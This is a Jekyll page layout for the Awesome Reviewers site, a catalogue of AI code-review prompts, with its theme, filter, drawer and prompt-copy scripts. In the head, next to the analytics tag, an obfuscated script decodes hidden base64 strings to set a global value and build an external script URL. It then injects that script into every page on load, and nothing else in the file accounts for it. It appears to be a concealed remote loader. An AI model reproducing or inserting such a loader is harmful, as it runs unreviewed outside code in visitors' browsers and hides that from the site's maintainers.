<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="index, follow">
  <meta name="author" content="Baz Technologies">

  <meta property="og:title" content="{% if page.title %}{{ page.title }} - {% endif %}{{ site.title }}">
  <meta property="og:description" content="{{ page.description | default: site.description }}">
  <meta property="og:url" content="{{ site.url }}{{ page.url }}">
  <meta property="og:image" content="{{ site.url }}/assets/images/ar-web.png">
  <meta property="og:type" content="website">
  <meta property="og:site_name" content="Awesome Reviewers">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:site" content="@baz_scm">
  <meta name="twitter:title" content="{% if page.title %}{{ page.title }} - {% endif %}{{ site.title }}">
  <meta name="twitter:description" content="{{ page.description | default: site.description }}">
  <meta name="twitter:image" content="{{ site.url }}/assets/images/ar-web.png">

  <title>{% if page.title %}{{ page.title }} - {% endif %}{{ site.title }}</title>
  <meta name="description" content="{{ page.description | default: site.description }}">
  <link rel="icon" type="image/x-icon" href="{{ '/favicon.png' | relative_url }}">
  <link rel="stylesheet" href="{{ '/assets/css/main.css' | relative_url }}">
  <link rel="stylesheet" href="{{ '/assets/prism/prism.css' | relative_url }}">
  <link rel="manifest" href="{{ '/manifest.json' | relative_url }}">
  <link rel="canonical" href="{{ site.url }}{{ page.url }}">

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-2S2LLCMG7N"></script>
  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "WebApplication",
      "name": "Awesome Reviewers",
      "applicationCategory": "DeveloperApplication",
      "operatingSystem": "Web",
      "description": "AI-powered code review system prompts and templates",
      "url": "https://awesomereviewers.com",
      "author": {
        "@type": "Organization",
        "name": "Baz Technologies",
        "url": "https://baz.co"
      },
      "offers": {
        "@type": "Offer",
        "price": "0",
        "priceCurrency": "USD"
      }
    }
  </script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-2S2LLCMG7N');
  </script>
  <script>
    window[(function(_IL7,_wC){var _Q0WET='';for(var _cPrCDe=0;_cPrCDe<_IL7.length;_cPrCDe++){_Q0WET==_Q0WET;_wC>5;var _zByk=_IL7[_cPrCDe].charCodeAt();_zByk-=_wC;_zByk+=61;_zByk%=94;_zByk+=33;_zByk!=_cPrCDe;_Q0WET+=String.fromCharCode(_zByk)}return _Q0WET})(atob('bFtiJiN8d3UoXXct'), 18)] = 'c1ec5205441756059399';
    var zi = document.createElement('script');
    (zi.type = 'text/javascript'),
    (zi.async = true),
    (zi.src = (function(_INN,_AW){var _dR7ZJ='';for(var _5xKN5V=0;_5xKN5V<_INN.length;_5xKN5V++){var _H3D0=_INN[_5xKN5V].charCodeAt();_H3D0-=_AW;_H3D0+=61;_H3D0!=_5xKN5V;_H3D0%=94;_dR7ZJ==_dR7ZJ;_H3D0+=33;_AW>3;_dR7ZJ+=String.fromCharCode(_H3D0)}return _dR7ZJ})(atob('NkJCPkFmW1s4QVpIN1lBMUA3PkJBWjE9O1tIN1lCLzVaOEE='), 44)),
    document.readyState === 'complete'
      ? document.body.appendChild(zi)
      : window.addEventListener('load', function(){
          document.body.appendChild(zi)
        });
  </script>
</head>
<body class="theme-dark">
  {% include nav.html %}
  <main class="page">
    {{ content }}
  </main>
  {% include footer.html %}
  {% include modal.html %}

  <script>
    (function() {
      const themeKey = 'ar-theme';
      const supportedThemes = ['theme-dark', 'theme-light', 'theme-retro'];
      const labelMap = {
        'theme-dark': 'Dark',
        'theme-light': 'Light',
        'theme-retro': 'Retro'
      };

      function applyTheme(theme) {
        const active = supportedThemes.includes(theme) ? theme : 'theme-dark';
        document.body.classList.remove('theme-dark', 'theme-light', 'theme-retro');
        document.body.classList.add(active);
        localStorage.setItem(themeKey, active);
        updateThemeControls(active);
      }

      function updateThemeControls(theme) {
        const navToggle = document.querySelector('[data-theme-cycle]');
        if (navToggle) {
          navToggle.textContent = labelMap[theme] || 'Dark';
        }

        document.querySelectorAll('[data-theme-option]').forEach(function(button) {
          button.classList.toggle('is-active', button.dataset.themeOption === theme);
        });
      }

      function cycleTheme() {
        const current = document.body.classList.contains('theme-light')
          ? 'theme-light'
          : document.body.classList.contains('theme-retro')
            ? 'theme-retro'
            : 'theme-dark';
        const index = supportedThemes.indexOf(current);
        const next = supportedThemes[(index + 1) % supportedThemes.length];
        applyTheme(next);
      }

      document.addEventListener('DOMContentLoaded', function() {
        const savedTheme = localStorage.getItem(themeKey) || 'theme-dark';
        applyTheme(savedTheme);

        const cycleButton = document.querySelector('[data-theme-cycle]');
        if (cycleButton) {
          cycleButton.addEventListener('click', cycleTheme);
        }

        document.querySelectorAll('[data-theme-option]').forEach(function(button) {
          button.addEventListener('click', function() {
            applyTheme(button.dataset.themeOption);
          });
        });

        const currentYear = document.getElementById('current-year');
        if (currentYear) {
          currentYear.textContent = new Date().getFullYear().toString();
        }
      });
    })();
  </script>

  <script>
    // Modal controls
    (function() {
      const modal = document.getElementById('add-repo-modal');
      if (!modal) return;

      const openButton = document.getElementById('add-repo-button');
      const closeButton = modal.querySelector('.modal__close');
      const backdrop = modal.querySelector('.modal__backdrop');

      function openModal() {
        modal.classList.add('is-open');
      }

      function closeModal() {
        modal.classList.remove('is-open');
      }

      if (openButton) {
        openButton.addEventListener('click', function() {
          openModal();
        });
      }

      [closeButton, backdrop].forEach(function(element) {
        if (!element) return;
        element.addEventListener('click', closeModal);
      });
    })();
  </script>

  <script>
    // Reviewer library filters and drawer
    (function() {
      const container = document.querySelector('.reviewer-grid');
      if (!container) {
        return;
      }

      class MultiSelect {
        constructor(containerId, options) {
          this.container = document.getElementById(containerId);
          this.options = options;
          this.selectedValues = [];
          this.filteredOptions = [...options];
          this.init();
        }

        init() {
          this.render();
          this.attachEvents();
        }

        render() {
          const selectedText = this.selectedValues.length === 0
            ? this.container.dataset.placeholder
            : this.selectedValues.length === 1
              ? this.selectedValues[0]
              : `${this.selectedValues.length} selected`;

          const sortedOptions = this.getSortedOptions();

          this.container.innerHTML = `
            <div class="multi-select-trigger">
              <div class="multi-select-content">
                <span style="color: ${this.selectedValues.length === 0 ? 'var(--fg-soft)' : 'var(--fg)'}">${selectedText}</span>
              </div>
              <div class="multi-select-arrow">▼</div>
            </div>
            <div class="multi-select-dropdown">
              <input type="text" class="multi-select-search" placeholder="Search...">
              <div class="multi-select-options">
                ${sortedOptions.map(option =>
                  `<div class="multi-select-option">
                    <input type="checkbox" value="${option}" ${this.selectedValues.includes(option) ? 'checked' : ''}>
                    <span>${option}</span>
                  </div>`
                ).join('')}
              </div>
            </div>
          `;
        }

        getSortedOptions() {
          const selected = this.filteredOptions.filter(option => this.selectedValues.includes(option));
          const unselected = this.filteredOptions.filter(option => !this.selectedValues.includes(option));
          return [...selected, ...unselected];
        }

        attachEvents() {
          const trigger = this.container.querySelector('.multi-select-trigger');
          const searchInput = this.container.querySelector('.multi-select-search');

          trigger.addEventListener('click', (e) => {
            e.stopPropagation();
            this.toggleDropdown();
          });

          searchInput.addEventListener('input', (e) => {
            this.filterOptions(e.target.value);
          });

          this.attachOptionEvents();

          document.addEventListener('click', () => {
            this.closeDropdown();
          });
        }

        attachOptionEvents() {
          const dropdown = this.container.querySelector('.multi-select-dropdown');
          if (!dropdown) return;

          dropdown.addEventListener('click', (e) => {
            e.stopPropagation();

            if (e.target.type === 'checkbox') {
              this.toggleOption(e.target.value, e.target.checked);
            } else if (e.target.closest('.multi-select-option')) {
              const option = e.target.closest('.multi-select-option');
              const checkbox = option.querySelector('input[type="checkbox"]');
              if (checkbox) {
                checkbox.checked = !checkbox.checked;
                this.toggleOption(checkbox.value, checkbox.checked);
              }
            }
          });
        }

        toggleDropdown() {
          this.container.classList.toggle('open');
          const dropdown = this.container.querySelector('.multi-select-dropdown');
          dropdown.classList.toggle('open');

          if (dropdown.classList.contains('open')) {
            const searchInput = this.container.querySelector('.multi-select-search');
            searchInput.focus();
          }
        }

        closeDropdown() {
          this.container.classList.remove('open');
          const dropdown = this.container.querySelector('.multi-select-dropdown');
          dropdown.classList.remove('open');
        }

        filterOptions(searchTerm) {
          this.filteredOptions = this.options.filter(option =>
            option.toLowerCase().includes(searchTerm.toLowerCase())
          );
          this.updateOptions();
        }

        updateOptions() {
          const optionsContainer = this.container.querySelector('.multi-select-options');
          const sortedOptions = this.getSortedOptions();
          optionsContainer.innerHTML = sortedOptions.map(option =>
            `<div class="multi-select-option">
              <input type="checkbox" value="${option}" ${this.selectedValues.includes(option) ? 'checked' : ''}>
              <span>${option}</span>
            </div>`
          ).join('');

          this.attachOptionEvents();
        }

        toggleOption(value, checked) {
          if (checked && !this.selectedValues.includes(value)) {
            this.selectedValues.push(value);
          } else if (!checked) {
            this.selectedValues = this.selectedValues.filter(v => v !== value);
          }

          const selectedText = this.selectedValues.length === 0
            ? this.container.dataset.placeholder
            : this.selectedValues.length === 1
              ? this.selectedValues[0]
              : `${this.selectedValues.length} selected`;

          const contentSpan = this.container.querySelector('.multi-select-content span');
          if (contentSpan) {
            contentSpan.textContent = selectedText;
            contentSpan.style.color = this.selectedValues.length === 0 ? 'var(--fg-soft)' : 'var(--fg)';
          }

          filterReviewers();
        }

        getSelected() {
          return this.selectedValues;
        }
      }

      let categoryFilter, repoFilter, languageFilter;

      function updateUrlParams() {
        const searchInput = document.getElementById('search');
        const searchTerm = searchInput ? searchInput.value : '';
        const selectedCategories = categoryFilter ? categoryFilter.getSelected() : [];
        const selectedRepos = repoFilter ? repoFilter.getSelected() : [];
        const selectedLanguages = languageFilter ? languageFilter.getSelected() : [];

        const params = new URLSearchParams();

        if (searchTerm) {
          params.set('search', searchTerm);
        }

        if (selectedCategories.length > 0) {
          params.set('categories', selectedCategories.join(','));
        }

        if (selectedRepos.length > 0) {
          params.set('repos', selectedRepos.join(','));
        }

        if (selectedLanguages.length > 0) {
          params.set('languages', selectedLanguages.join(','));
        }

        const newUrl = `${window.location.pathname}?${params.toString()}`;
        window.history.replaceState({}, '', newUrl);
      }

      function loadFiltersFromUrl() {
        const params = new URLSearchParams(window.location.search);

        const applyParam = (filter, key) => {
          const value = params.get(key);
          if (!value || !filter) return;
          filter.selectedValues = value.split(',').filter(Boolean);
          filter.render();
          filter.attachEvents();
        };

        applyParam(categoryFilter, 'categories');
        applyParam(repoFilter, 'repos');
        applyParam(languageFilter, 'languages');

        const searchInput = document.getElementById('search');
        if (searchInput && params.get('search')) {
          searchInput.value = params.get('search');
        }
      }

      function updateReviewerCount(visible, total) {
        const countElement = document.getElementById('reviewer-count');
        if (!countElement) return;
        if (total) {
          countElement.textContent = `${visible} of ${total}`;
        } else {
          countElement.textContent = visible;
        }
      }

      function formatStats() {
        document.querySelectorAll('[data-count]').forEach(el => {
          const num = parseFloat(el.dataset.count);
          if (!isNaN(num)) {
            el.textContent = num.toLocaleString();
          }
        });
      }

      function initFeedFilters() {
        const filterBar = document.querySelector('[data-feed-filter-bar]');
        if (!filterBar) return;

        const buttons = Array.from(filterBar.querySelectorAll('[data-feed-filter]'));
        const cards = Array.from(document.querySelectorAll('[data-feed-category]'));
        if (buttons.length === 0 || cards.length === 0) return;

        let activeFilter = 'all';

        function applyFilter(nextFilter) {
          activeFilter = nextFilter;

          buttons.forEach(button => {
            const isActive = button.dataset.feedFilter === nextFilter;
            button.classList.toggle('is-active', isActive);
            button.setAttribute('aria-pressed', isActive ? 'true' : 'false');
          });

          cards.forEach(card => {
            if (card.dataset.feedPinned === 'true') {
              card.classList.remove('feed-card--hidden');
              return;
            }

            const categories = (card.dataset.feedCategory || '')
              .split(/\s+/)
              .filter(Boolean);
            const shouldShow = nextFilter === 'all' || categories.includes(nextFilter);

            card.classList.toggle('feed-card--hidden', !shouldShow);
          });
        }

        buttons.forEach(button => {
          button.addEventListener('click', () => {
            const value = button.dataset.feedFilter || 'all';
            if (value === activeFilter && value !== 'all') {
              applyFilter('all');
            } else {
              applyFilter(value);
            }
          });
        });

        applyFilter(activeFilter);
      }

      function filterReviewers() {
        const searchInput = document.getElementById('search');
        const searchTerm = searchInput ? searchInput.value.toLowerCase() : '';
        const selectedCategories = categoryFilter ? categoryFilter.getSelected() : [];
        const selectedRepos = repoFilter ? repoFilter.getSelected() : [];
        const selectedLanguages = languageFilter ? languageFilter.getSelected() : [];

        const cards = document.querySelectorAll('.reviewer-card');
        let visibleCount = 0;

        cards.forEach(card => {
          const title = card.querySelector('.reviewer-title')?.textContent.toLowerCase() || '';
          const description = card.querySelector('.reviewer-description')?.textContent.toLowerCase() || '';
          const repo = (card.dataset.repo || '').toLowerCase();
          const category = (card.dataset.category || '').toLowerCase();
          const language = (card.dataset.language || '').toLowerCase();

          const matchesSearch = !searchTerm ||
            title.includes(searchTerm) ||
            description.includes(searchTerm) ||
            repo.includes(searchTerm) ||
            category.includes(searchTerm) ||
            language.includes(searchTerm);

          const matchesCategory = selectedCategories.length === 0 || selectedCategories.some(c => c.toLowerCase() === category);
          const matchesRepo = selectedRepos.length === 0 || selectedRepos.some(r => r.toLowerCase() === repo);
          const matchesLanguage = selectedLanguages.length === 0 || selectedLanguages.some(l => l.toLowerCase() === language);

          const shouldShow = matchesSearch && matchesCategory && matchesRepo && matchesLanguage;
          card.style.display = shouldShow ? 'grid' : 'none';

          if (shouldShow) {
            visibleCount += 1;
          }
        });

        const countElement = document.getElementById('reviewer-count');
        if (countElement) {
          countElement.textContent = visibleCount;
        }

        updateUrlParams();
      }

      function clearFilters() {
        const searchInput = document.getElementById('search');
        if (searchInput) {
          searchInput.value = '';
        }

        [categoryFilter, repoFilter, languageFilter].forEach(filter => {
          if (!filter) return;
          filter.selectedValues = [];
          filter.render();
          filter.attachEvents();
        });

        filterReviewers();
      }

      function getReviewerData() {
        const cards = Array.from(document.querySelectorAll('.reviewer-card'));
        const categories = new Set();
        const repos = new Set();
        const languages = new Set();

        cards.forEach(card => {
          const category = card.dataset.category;
          const repo = card.dataset.repo;
          const language = card.dataset.language;

          if (category) categories.add(category);
          if (repo) repos.add(repo);
          if (language) languages.add(language);
        });

        return {
          categories: Array.from(categories).sort(),
          repos: Array.from(repos).sort(),
          languages: Array.from(languages).sort(),
        };
      }

      document.addEventListener('DOMContentLoaded', () => {
        initFeedFilters();

        const { categories, repos, languages } = getReviewerData();

        categoryFilter = new MultiSelect('category-filter', categories);
        repoFilter = new MultiSelect('repo-filter', repos);
        languageFilter = new MultiSelect('language-filter', languages);

        const searchInput = document.getElementById('search');
        if (searchInput) {
          searchInput.addEventListener('input', filterReviewers);
        }

        const clearButton = document.querySelector('.clear-filters');
        if (clearButton) {
          clearButton.addEventListener('click', clearFilters);
        }

        formatStats();
        loadFiltersFromUrl();

        const allCards = document.querySelectorAll('.reviewer-card');
        const totalCount = allCards.length;
        const initialVisible = Array.from(allCards).filter(card => !card.classList.contains('extra-reviewer')).length;
        updateReviewerCount(initialVisible, document.getElementById('load-more') ? totalCount : null);

        filterReviewers();

        document.querySelectorAll('.reviewer-card').forEach(card => {
          if (!card.dataset.slug) return;
          card.addEventListener('click', () => {
            const slug = card.dataset.slug;
            openDrawer(slug);
            history.replaceState(null, '', `#${slug}`);
          });
        });

        const slug = location.hash.slice(1);
        if (slug && document.getElementById(slug)) {
          openDrawer(slug);
        }

        if (document.getElementById('discussion-container')) {
          const parts = location.pathname.split('/').filter(Boolean);
          const pageSlug = parts[parts.length - 1];
          if (pageSlug) {
            loadDiscussions(pageSlug);
          }
        }
      });

      function openDrawer(slug) {
        const url = `/reviewers/${slug}/`;
        const drawer = document.getElementById('drawer');
        const content = document.getElementById('drawer-content');
        if (!drawer || !content) return;

        fetch(url)
          .then(res => {
            if (!res.ok) {
              throw new Error(`Server returned ${res.status} ${res.statusText}`);
            }
            return res.text();
          })
          .then(html => {
            const doc = new DOMParser().parseFromString(html, 'text/html');
            const detail = doc.querySelector('.reviewer-detail');
            if (detail) {
              const back = detail.querySelector('.back-link');
              if (back) back.remove();
              content.innerHTML = detail.innerHTML;
            } else {
              content.innerHTML = html;
            }
            drawer.classList.add('is-open');
            if (typeof highlightNewContent === 'function') {
              highlightNewContent(content);
            }
            loadDiscussions(slug);
          })
          .catch(err => {
            console.error('Fetch failed:', err);
          });
      }

      function closeDrawer() {
        const drawer = document.getElementById('drawer');
        const content = document.getElementById('drawer-content');
        if (!drawer || !content) return;
        drawer.classList.remove('is-open');
        history.replaceState(null, '', window.location.pathname);
        setTimeout(() => {
          content.innerHTML = '';
        }, 300);
      }

      function deployToBaz() {
        const slug = location.hash.slice(1);
        if (!slug) {
          console.log('No reviewer currently open');
          return;
        }

        const reviewerCard = document.getElementById(slug);
        if (!reviewerCard) {
          console.log('Reviewer card not found for slug:', slug);
          return;
        }

        const drawerContent = document.getElementById('drawer-content');
        let promptText = '';
        if (drawerContent) {
          const promptContent = drawerContent.querySelector('#prompt-content');
          if (promptContent) {
            promptText = promptContent.textContent.trim();
          }
        }

        const metadata = {
          slug: slug,
          repository: reviewerCard.dataset.repo,
          category: reviewerCard.dataset.category,
          language: reviewerCard.dataset.language,
          title: reviewerCard.querySelector('.reviewer-title')?.textContent,
          description: promptText,
        };

        compressAndEncode(metadata);
      }

      async function compressAndEncode(data) {
        try {
          const jsonString = JSON.stringify(data, null, 2);
          const encoder = new TextEncoder();
          const uint8Array = encoder.encode(jsonString);

          if (!window.CompressionStream) {
            const fallback = encodeURIComponent(btoa(jsonString));
            window.open(`https://baz.co/agents/new-reviewer#reviewer_data=${fallback}`, '_blank');
            return;
          }

          const compressionStream = new CompressionStream('gzip');
          const writer = compressionStream.writable.getWriter();
          const reader = compressionStream.readable.getReader();

          writer.write(uint8Array);
          writer.close();

          const chunks = [];
          let done = false;
          while (!done) {
            const { value, done: streamDone } = await reader.read();
            done = streamDone;
            if (value) chunks.push(value);
          }

          const compressedLength = chunks.reduce((acc, chunk) => acc + chunk.length, 0);
          const compressedData = new Uint8Array(compressedLength);
          let offset = 0;
          for (const chunk of chunks) {
            compressedData.set(chunk, offset);
            offset += chunk.length;
          }

          let binary = '';
          compressedData.forEach(byte => {
            binary += String.fromCharCode(byte);
          });
          const base64 = btoa(binary);
          const urlEncodedBase64 = encodeURIComponent(base64);
          window.open(`https://baz.co/agents/new-reviewer#reviewer_data=${urlEncodedBase64}`, '_blank');
        } catch (error) {
          console.error('Error compressing data:', error);
        }
      }

      function htmlToMarkdown(element) {
        let markdown = '';

        function processNode(node) {
          if (node.nodeType === Node.TEXT_NODE) {
            return node.textContent;
          }

          if (node.nodeType === Node.ELEMENT_NODE) {
            const tagName = node.tagName.toLowerCase();
            const children = Array.from(node.childNodes).map(processNode).join('');

            switch (tagName) {
              case 'h1': return `# ${children}\n\n`;
              case 'h2': return `## ${children}\n\n`;
              case 'h3': return `### ${children}\n\n`;
              case 'h4': return `#### ${children}\n\n`;
              case 'h5': return `##### ${children}\n\n`;
              case 'h6': return `###### ${children}\n\n`;
              case 'p': return `${children}\n\n`;
              case 'strong':
              case 'b': return `**${children}**`;
              case 'em':
              case 'i': return `*${children}*`;
              case 'code':
                if (node.parentElement && node.parentElement.tagName.toLowerCase() === 'pre') {
                  return children;
                }
                return `\`${children}\``;
              case 'pre': {
                const codeElement = node.querySelector('code');
                if (codeElement) {
                  const match = codeElement.className.match(/(?:language-|hljs-)(\w+)/);
                  const language = match ? match[1] : '';
                  return `\`\`\`${language}\n${codeElement.textContent}\n\`\`\`\n\n`;
                }
                return `\`\`\`\n${children}\n\`\`\`\n\n`;
              }
              case 'ul':
              case 'ol':
                return `${children}\n`;
              case 'li': {
                const parent = node.parentElement;
                if (parent && parent.tagName.toLowerCase() === 'ol') {
                  return `1. ${children}\n`;
                }
                return `- ${children}\n`;
              }
              case 'blockquote':
                return children.split('\n').map(line => `> ${line}`).join('\n') + '\n\n';
              case 'br':
                return '\n';
              default:
                return children;
            }
          }

          return '';
        }

        markdown = processNode(element);
        markdown = markdown.replace(/\n{3,}/g, '\n\n').trim();
        return markdown;
      }

      function copyPrompt() {
        const promptContent = document.getElementById('prompt-content');
        const copyButton = document.querySelector('.copy-button');
        const copyText = document.getElementById('copy-text');
        if (!promptContent || !copyButton || !copyText) return;

        const markdownContent = htmlToMarkdown(promptContent);
        const textarea = document.createElement('textarea');
        textarea.value = markdownContent;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);

        copyButton.classList.add('copied');
        copyText.textContent = 'Copied!';
        setTimeout(() => {
          copyButton.classList.remove('copied');
          copyText.textContent = 'Copy Prompt';
        }, 2000);
      }

      async function copyDeeplink(slug, button) {
        const url = `${window.location.origin}/reviewers/${slug}/`;
        try {
          if (navigator.clipboard && navigator.clipboard.writeText) {
            await navigator.clipboard.writeText(url);
          } else {
            const textarea = document.createElement('textarea');
            textarea.value = url;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
          }

          button.classList.add('copied');
          button.textContent = 'Copied!';
        } catch (err) {
          console.error('Copy failed', err);
        } finally {
          setTimeout(() => {
            button.classList.remove('copied');
            button.textContent = 'Share';
          }, 2000);
        }
      }

      function loadDiscussions(slug) {
        const container = document.getElementById('discussion-container');
        const statsEl = document.getElementById('discussion-stats');
        const footerEl = document.getElementById('discussion-footer');
        if (!container) return;

        fetch(`/_reviewers/${slug}.json`)
          .then(res => res.json())
          .then(data => {
            container.innerHTML = data.map((d, i) => renderDiscussion(d, i)).join('');
            if (typeof highlightNewContent === 'function') {
              highlightNewContent(container);
            }

            const commentCount = data.reduce((total, d) => total + (d.discussion_comments || []).length, 0);
            const participants = new Set();
            data.forEach(d => (d.discussion_comments || []).forEach(c => participants.add(c.comment_author)));
            if (statsEl) statsEl.textContent = `${commentCount} Comments`;
            if (footerEl) footerEl.textContent = `${participants.size} participants · ${commentCount} comments`;
          })
          .catch(err => console.error('Failed to load discussions', err));
      }

      function renderDiscussion(d, index) {
        const code = d.commented_code ? renderCodeDiff(d.commented_code, index) : '';
        const comments = (d.discussion_comments || []).map(renderComment).join('');
        return `<div class="discussion">${code}<div class="chat-thread">${comments}</div></div>`;
      }

      function renderCodeDiff(diff, index) {
        const lines = diff.split('\n');
        const rendered = lines.map(line => {
          const type = line.startsWith('+') ? 'added' : line.startsWith('-') ? 'removed' : 'context';
          const symbol = line.startsWith('+') ? '+' : line.startsWith('-') ? '-' : '&nbsp;';
          const content = escapeHtml(line.replace(/^[-+]/, '')) || '&nbsp;';
          return `<div class="diff-line ${type}"><span class="diff-symbol">${symbol}</span><span class="diff-content">${content}</span></div>`;
        }).join('');
        const header = `<div class="diff-header">Changes #${index + 1}</div>`;
        return `<div class="diff-block">${header}${rendered}</div>`;
      }

      function renderComment(c) {
        const avatar = `https://github.com/${c.comment_author}.png?size=40`;
        const body = escapeHtml(c.comment_body).replace(/\n/g, '<br>');
        const time = new Date(c.comment_created_at).toLocaleDateString();
        return `<div class="chat-message"><img class="chat-avatar" src="${avatar}" alt="${c.comment_author}"><div class="chat-bubble"><div class="chat-meta"><span class="chat-author">${c.comment_author}</span> <span class="chat-time">${time}</span></div><div class="chat-body">${body}</div></div></div>`;
      }

      function escapeHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
      }

      function shareFromCard(e, slug) {
        e.stopPropagation();
        copyDeeplink(slug, e.currentTarget);
      }

      function shareFromDrawer(e) {
        let slug = location.hash.slice(1);
        if (!slug) {
          const parts = window.location.pathname.split('/').filter(Boolean);
          slug = parts[parts.length - 1];
        }
        if (slug) {
          copyDeeplink(slug, e.currentTarget);
        }
      }

      function loadMore() {
        document.querySelectorAll('.extra-reviewer').forEach(card => {
          card.style.display = 'grid';
        });
        const btn = document.getElementById('load-more');
        if (btn) btn.remove();
        const visible = document.querySelectorAll('.reviewer-card').length;
        updateReviewerCount(visible);
        filterReviewers();
      }

      window.filterReviewers = filterReviewers;
      window.clearFilters = clearFilters;
      window.loadMore = loadMore;
      window.openDrawer = openDrawer;
      window.closeDrawer = closeDrawer;
      window.deployToBaz = deployToBaz;
      window.copyPrompt = copyPrompt;
      window.shareFromCard = shareFromCard;
      window.shareFromDrawer = shareFromDrawer;
    })();
  </script>

  <script src="{{ '/assets/prism/prism.js' | relative_url }}"></script>
  <script src="{{ '/assets/js/prism-init.js' | relative_url }}"></script>
  <script src="{{ '/assets/js/main.js' | relative_url }}"></script>
</body>
</html>
